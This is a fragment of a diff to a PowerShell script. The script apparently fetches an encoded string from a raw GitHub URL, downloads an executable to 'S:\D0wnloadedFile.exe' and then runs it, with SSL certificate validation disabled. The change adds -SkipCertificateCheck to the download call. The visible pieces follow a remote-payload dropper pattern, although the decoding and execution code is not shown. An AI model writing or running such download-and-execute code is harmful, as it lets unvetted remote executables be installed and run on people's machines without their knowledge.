@@ -56,7 +56,7 @@ Ignore-SSLCertificateValidation
 $url = "https://raw.githubusercontent.com/notforuseactually/404/main/4.txt" # Replace this with the actual URL containing the custom encoded string
 
 # Use Invoke-RestMethod to fetch the content from the URL
-$rawText = Invoke-WebRequest -Uri $url -OutFile $path -SkipCertificateCheck -ErrorAction Stop
+$rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop
 
 # Display the raw text content for troubleshooting
 Write-Host "Raw text from URL:"
@@ -91,7 +91,7 @@ $downloadPath = "S:\D0wnloadedFile.exe" # Change to your desired path and filena
 # Function to download the file from the URL
 Function Download-File {
     Param ([string]$url, [string]$path)
-    Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
+    Invoke-WebRequest -Uri $url -OutFile $path -SkipCertificateCheck -ErrorAction Stop
 }
 
 # Function to execute the downloaded file
